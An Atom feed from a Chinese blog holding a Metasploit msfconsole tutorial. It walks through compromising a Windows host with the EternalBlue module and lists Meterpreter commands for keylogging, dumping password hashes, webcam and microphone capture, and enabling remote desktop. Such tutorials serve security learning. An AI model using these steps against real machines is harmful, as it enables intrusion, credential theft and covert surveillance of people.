<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>時雨のblog</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-12-11T06:55:19.241Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>時雨</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>1</title>
    <link href="http://example.com/2021/12/11/%E7%99%BB%E5%BD%95%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/"/>
    <id>http://example.com/2021/12/11/%E7%99%BB%E5%BD%95%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/</id>
    <published>2021-12-11T06:55:19.000Z</published>
    <updated>2021-12-11T06:55:19.241Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>Msfconsole</title>
    <link href="http://example.com/2021/11/15/Msfconsole/"/>
    <id>http://example.com/2021/11/15/Msfconsole/</id>
    <published>2021-11-15T00:55:36.000Z</published>
    <updated>2021-12-11T01:24:21.695Z</updated>
    
    <content type="html"><![CDATA[        <h2 id="Msfconsole"   >          <a href="#Msfconsole" class="heading-link"><i class="fas fa-link"></i></a><a href="#Msfconsole" class="headerlink" title="Msfconsole"></a>Msfconsole</h2>      <p><strong>Msfconsole初始化参数：</strong></p><p>-E、 –环境环境设置Rails环境，默认为RAIL_ENV环境变量或“production”</p><p>-M、 –迁移路径目录指定包含其他数据库迁移的目录</p><p>-n、 –无数据库禁用数据库支持</p><p>-y、 –yaml PATH指定包含数据库设置的yaml文件</p><p>-c文件加载指定的配置文件</p><p>-v、 -v，–version显示版本</p><p>–defer-module-loads –延迟模块加载延迟模块加载，除非明确要求</p><p>-m、 –模块路径目录加载其他模块路径</p><p>-a、 –退出Metasploit前询问或接受“退出-y”</p><p>-H、 –历史记录文件将命令历史记录保存到指定文件</p><p>-l、 –记录器字符串指定要使用的记录器（Flatfile、StdoutWithoutTimestamps、Stderr、Stdout</p><p>z`TimestampColorlessFlatfile）</p><p>-L,   –real readline使用系统readline库而不是RbReadline</p><p>-o、 –输出文件输出到指定的文件</p><p>-p、 –插件启动时加载插件</p><p>-q、 –启动时不要打印横幅</p><p>-r、 –资源文件执行指定的资源文件（-for stdin）</p><p>-x、 –执行命令执行指定的控制台命令（使用；多个）</p><p><strong>Msfconsole启动后参数：</strong></p><p>advanced      高级显示一个或多个模块的高级选项</p><p>back              后退从当前上下文向后移动</p><p>clearm           clearm清除模块堆栈</p><p>favorite          收藏夹将模块添加到收藏夹模块列表中</p><p>info                信息显示有关一个或多个模块的信息</p><p>listm               列出模块堆栈</p><p>loadpath         从路径中搜索并加载模块</p><p>options           选项显示一个或多个模块的全局选项或</p><p>popm             将最新模块从堆栈中弹出并使其处于活动状态</p><p>previous        将以前加载的模块设置为当前模块</p><p>pushm           将活动或模块列表推送到模块堆栈上</p><p>reload_all      重新加载\u all从所有定义的模块路径重新加载所有模块</p><p>search          搜索模块名称和描述</p><p>show            显示显示给定类型的模块或所有模块</p><p>use               使用“按名称或搜索词/索引与模块交互”</p><p><strong>常用模块解释：</strong></p><p>search 搜索列举相关模块</p><p><img src="/images/msfc1.png"></p><p>use 选择相关模块</p><p><img src="/images/msfc2.png"></p><p>show options 显示模块的相关参数</p><p><img src="/images/msfc3.png"></p><p>back 退出当前模块</p><p><img src="/images/msfc4.png"></p><p>set 用来设置选择模块后的载荷</p><p><img src="/images/msfc5.png"></p><p>run和exploit运行当前模块</p><p><img src="/images/msfc6.png"></p><p><strong>利用永恒之蓝进行简单的一次渗透：</strong></p><p>启动软件：</p><p><img src="/images/msfc7.png"></p><p>搜索Ms17_010模块并选择：</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">格式：search </span><br><span class="line">格式：use exploit/windows/smb/ms17_010_eternalblue</span><br></pre></td></tr></table></div></figure><p><img src="/images/msfc9.png"></p><p>列出当前选择模块的可用内容：</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式：show options</span><br></pre></td></tr></table></div></figure><p><img src="/images/msfc8.png"></p><p>利用set设置上面显示内容的RHOSTS 指定要攻击的电脑IP</p><p><img src="/images/msfc10.png"></p><p>输入run或exploit运行当前模块，拿到控制台</p><p><img src="/images/msfc11.png"></p><p><img src="/images/msfc12.png"></p><p><strong>Meterpreter命令：</strong></p><p>cat /路径/ 查看文件内容</p><p>del /路径/ 删除指定内容</p><p>upload /路径/ 上传文件到目标主机</p><p>download /路径/ 下载目标主机文件到本地主机</p><p>pwd 查看当前所在路径</p><p>mv 修改目标主机上的文件名</p><p>keyscan_start 开启键盘记录功能</p><p>keyscan_dump 显示捕捉到的键盘记录信息</p><p>keyscan_stop 停止键盘记录功能</p><p>reboot 重启目标主机</p><p>shell 拿到cmd</p><p>sysinfo 查看目标主机信息</p><p>hashdump 获取目标主机用户名的hash值</p><p>vnc 远程桌面</p><p>record_mic 音频录制</p><p>webcam_chat 查看摄像头接口</p><p>webcam_list 查看摄像头列表</p><p>webcam_stream 摄像头获取</p><p>keylogrecorder 记录键盘信息</p><p>run post/windows/manage/enable_rdp 开启目标远程3389</p>]]></content>
    
    
      
      
    <summary type="html">
        &lt;h2 id=&quot;Msfconsole&quot;   &gt;
          &lt;a href=&quot;#Msfconsole&quot; class=&quot;heading-link&quot;&gt;&lt;i class=&quot;fas fa-link&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;a href=&quot;#Msfconsole&quot; c</summary>
      
    
    
    
    <category term="渗透" scheme="http://example.com/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="渗透工具" scheme="http://example.com/tags/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
</feed>
